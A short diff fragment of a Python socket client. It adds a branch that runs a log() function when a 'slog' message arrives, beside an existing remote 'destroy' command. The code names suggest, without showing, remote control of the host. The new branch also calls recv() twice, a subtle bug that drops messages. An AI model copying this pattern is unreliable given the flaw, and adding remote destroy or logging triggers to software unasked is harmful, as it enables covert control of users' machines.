@@ -24,4 +24,6 @@ def send(msg):
 while True:
     if client.recv(HEADER).decode("utf-8")=="destroy":
         destroy()
+    elif client.recv(HEADER).decode("utf-8")=="slog":
+        log()
     
